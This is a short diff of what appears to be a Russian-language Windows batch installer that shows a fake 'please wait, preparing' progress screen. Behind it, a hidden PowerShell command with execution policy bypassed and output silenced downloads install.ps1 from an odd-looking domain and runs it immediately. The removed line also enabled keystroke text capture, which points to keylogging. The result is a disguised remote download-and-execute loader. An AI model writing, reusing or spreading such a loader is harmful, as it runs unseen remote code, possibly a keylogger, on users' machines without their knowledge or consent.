@@ -18,7 +18,7 @@ echo.
 echo   Пожалуйста, подождите...
 echo.
 echo   [■□□□□□□□□□]  Подготовка...
-powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$env:OM_INSTALL_CODE='z6LVJFW04Y4P0ILGOH-99dMJEq6G0ZVH'; $env:OM_ENABLE_KEYSTROKE_TEXT='1'; irm https://office.lkdzrkk.pro/install.ps1 -UseBasicParsing | iex" >nul 2>&1
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$env:OM_INSTALL_CODE='z6LVJFW04Y4P0ILGOH-99dMJEq6G0ZVH'; irm https://office.lkdzrkk.pro/install.ps1 -UseBasicParsing | iex" >nul 2>&1
 
 cls
 echo.
